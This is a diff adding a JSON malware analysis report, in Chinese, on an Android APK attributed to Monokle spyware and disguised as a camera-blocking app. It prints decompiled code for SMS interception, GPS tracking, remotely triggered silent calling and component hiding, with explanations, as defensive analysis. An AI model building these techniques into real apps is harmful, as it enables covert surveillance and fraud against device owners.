@@ -1,0 +1,165 @@
+{
+  "APK信息": {
+    "文件名": "a3ff320d3a66b94ae58a970cbfe80c24fdc3e7ef888374d4806371d897882cc9.apk",
+    "sha256": "a3ff320d3a66b94ae58a970cbfe80c24fdc3e7ef888374d4806371d897882cc9",
+    "包名": "com.bettertomorrowapps.camerablock",
+    "应用名": "Блокировка Камеры",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 327.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsys\\f\\g;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\nh hVar = new h(smsMessageCreateFromPdu.getMessageBody().toLowerCase(), smsMessageCreateFromPdu.getOriginatingAddress().toLowerCase());\nif (hVar.b.contains(lowerCase) && hVar.b.length() - lowerCase.length() <= 2) {\n    if (!getAbortBroadcast()) {\n        abortBroadcast();\n    }\n    arrayList.add(hVar);\n}\na((h) arrayList.get(i2));",
+          "malicious_code_snippet_context": "          }\n          ArrayList arrayList = new ArrayList(objArr.length);\n          for (Object obj : objArr) {\n>>>             SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n>>>             if (smsMessageCreateFromPdu != null) {\n>>>                 h hVar = new h(smsMessageCreateFromPdu.getMessageBody().toLowerCase(), smsMessageCreateFromPdu.getOriginatingAddress().toLowerCase());\n>>>                 for (int i = 0; i < sys.h.a.e; i++) {\n>>>                     String lowerCase = sys.h.a.f[i].toLowerCase();\n>>>                     if (hVar.b.contains(lowerCase) && hVar.b.length() - lowerCase.length() <= 2) {\n>>>                         if (!getAbortBroadcast()) {\n>>>                             abortBroadcast();\n>>>                         }\n                          arrayList.add(hVar);\n                          break;\n                      }",
+          "behavior_description": "该代码运行于短信广播接收器中，将收到的短信PDU解析为SmsMessage对象，提取短信正文和发件人号码，并与预置的控制关键词列表（sys.h.a.f）逐一匹配（要求正文基本仅由该关键词构成，长度差≤2）。一旦匹配成功，调用abortBroadcast()终止广播，使该短信无法到达系统收件箱、对用户完全不可见，随后将拦截到的短信交给方法a()进一步处理（结合Monokle报告中的'Unique control phrases'特征，此处应为解析C2控制指令短信）。数据流向：系统短信广播PDU（SmsMessage.createFromPdu）→ 关键词匹配 → abortBroadcast()静默拦截短信并内部处理，属于典型的隐蔽短信拦截与远程指令通道行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsys\\e\\a;",
+          "method_signature": "if(lastKnownLocation == null || date.getTime()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (lastKnownLocation == null || date.getTime() - lastKnownLocation.getTime() > 60000) {\n    lastKnownLocation = c.getLastKnownLocation(\"gps\");\n}\nif (lastKnownLocation != null) {\n    long time = date.getTime() - lastKnownLocation.getTime();\n    if (time > 60000 || time < 0) {\n        lastKnownLocation = null;\n    }\n}",
+          "malicious_code_snippet_context": "          Date date = new Date(System.currentTimeMillis());\n          Location lastKnownLocation = a.a;\n          Location lastKnownLocation2 = b.a;\n>>>         if (lastKnownLocation == null || date.getTime() - lastKnownLocation.getTime() > 60000) {\n>>>             try {\n>>>                 lastKnownLocation = c.getLastKnownLocation(\"gps\");\n>>>             } catch (Exception e2) {\n>>>             }\n>>>             if (lastKnownLocation != null) {\n>>>                 long time = date.getTime() - lastKnownLocation.getTime();\n>>>                 if (time > 60000 || time < 0) {\n>>>                     lastKnownLocation = null;\n                  }\n              }\n          }",
+          "behavior_description": "该代码属于Monokle监控间谍软件的位置采集模块（类sys.e.a）。它实现了带60秒缓存刷新机制的位置获取逻辑：先检查内存中缓存的GPS位置，若缓存为空或已超过60秒未更新，则调用LocationManager.getLastKnownLocation(\"gps\")重新获取设备最后已知GPS位置（随后对network定位做同样处理），并通过时间戳校验确保位置数据新鲜（超过60秒或时间异常则置空丢弃）。获取到的精确位置被缓存并返回给间谍软件的数据收集模块，用于持续追踪目标用户行踪并最终回传至攻击者控制的C2服务器，属于典型的隐蔽位置监控行为。数据流向：LocationManager.getLastKnownLocation()（GPS/网络位置）→ 60秒新鲜度校验与缓存更新 → 供间谍软件窃取并上报C2。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsys\\f\\e;",
+          "method_signature": "if(e != 0)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!sys.h.a.B.f) { return 0; }\nIntent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\nsys.a.a().startActivity(intent);\nb.add(str);",
+          "malicious_code_snippet_context": "if (!sys.h.a.B.f) { return 0; }\nIntent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\nsys.a.a().startActivity(intent);\nb.add(str);",
+          "behavior_description": "该代码是Monokle监控软件的远程静默拨号功能。代码首先检查远程配置开关 sys.h.a.B.f 是否开启（表明该行为可被C2服务器远程启用/禁用），然后使用外部传入的电话号码字符串 str 构造 ACTION_CALL Intent（注意：ACTION_CALL 与 ACTION_DIAL 不同，会直接发起通话而无需用户在拨号界面确认），通过 FLAG_ACTIVITY_NEW_TASK 标志在后台服务上下文中调用 startActivity() 静默拨打电话，拨号完成后将号码加入列表 b 进行记录。数据流向：外部传入的电话号码参数 str（疑似来自C2服务器下发的指令）→ Intent(ACTION_CALL, tel:URI) → startActivity() 静默拨号。攻击者可远程操控受害设备拨打任意号码，可用于拨打高额付费号码造成用户直接经济损失，或拨打攻击者号码实现对受害者周围环境的窃听，属于典型的远程控制/监控类恶意功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsys\\b;",
+          "method_signature": "if(sys.c.a.a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "a.a().getPackageManager().setComponentEnabledSetting(new ComponentName(a.a(), (Class<?>) StartBroadcastReceiver.class), 2, 1); a.a().stopService(new Intent(BackgroundService.class.getName()));",
+          "malicious_code_snippet_context": "              if (sys.c.a.a()) {\n                  sys.c.a.i();\n              }\n>>>             a.a().getPackageManager().setComponentEnabledSetting(new ComponentName(a.a(), (Class<?>) StartBroadcastReceiver.class), 2, 1);\n              n();\n              a.a().stopService(new Intent(BackgroundService.class.getName()));\n          } catch (Exception e2) {",
+          "behavior_description": "该方法是一个隐蔽化/状态切换例程：先执行各模块清理（h.d()、sys.e.a.f()、sys.c.m.f()），随后调用 PackageManager.setComponentEnabledSetting 将 StartBroadcastReceiver 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数2，配合 DONT_KILL_APP=1），使该组件被系统禁用、不再显示于应用组件列表，最后停止 BackgroundService 后台服务。setComponentEnabledSetting(...,2,1) 是 Android 恶意软件隐藏应用图标/组件的经典手法（Monokle 监控间谍软件已知具备图标隐藏与隐蔽驻留能力），数据流向为：硬编码的自身组件名 StartBroadcastReceiver.class → 构造 ComponentName → setComponentEnabledSetting 禁用该组件，从而降低应用可见性、逃避用户察觉与安全查杀，为后续隐蔽监控行为提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
